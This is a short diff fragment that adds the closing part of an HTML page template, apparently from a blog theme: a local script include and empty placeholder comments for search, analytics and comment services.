+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
